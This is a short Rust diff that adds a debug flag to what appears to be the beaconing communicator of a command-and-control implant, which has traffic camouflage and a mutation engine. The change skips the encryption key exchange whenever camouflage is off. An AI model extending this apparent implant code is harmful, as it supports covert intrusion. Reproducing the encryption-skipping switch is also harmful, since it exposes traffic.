@@ -74,6 +74,7 @@ pub struct Communicator {
     mutation: Arc<RwLock<MutationEngine>>,
     traffic: Arc<RwLock<TrafficProfile>>,
     session_established: Arc<RwLock<bool>>,
+    debug_mode: bool,
     ws_sink: Arc<RwLock<Option<SplitSink<WsStream, WsMessage>>>>,
     ws_stream: Arc<RwLock<Option<SplitStream<WsStream>>>>,
 }
@@ -89,6 +90,7 @@ impl Communicator {
         mutation_seed: &[u8; 32],
         camouflage_mode: CamouflageMode,
     ) -> Self {
+        let debug_mode = matches!(camouflage_mode, CamouflageMode::None);
         let traffic = TrafficProfile::new(camouflage_mode, beacon_interval, mutation_seed);
 
         Self {
@@ -103,6 +105,7 @@ impl Communicator {
             mutation: Arc::new(RwLock::new(MutationEngine::new(mutation_seed))),
             traffic: Arc::new(RwLock::new(traffic)),
             session_established: Arc::new(RwLock::new(false)),
+            debug_mode,
             ws_sink: Arc::new(RwLock::new(None)),
             ws_stream: Arc::new(RwLock::new(None)),
         }
@@ -120,7 +123,11 @@ impl Communicator {
                         let mut attempts = self.reconnect_attempts.write().await;
                         *attempts = 0;
 
-                        self.perform_key_exchange().await?;
+                        if !self.debug_mode {
+                            self.perform_key_exchange().await?;
+                        } else {
+                            info!("Debug mode: skipping encryption");
+                        }
 
                         Ok(())
                     }
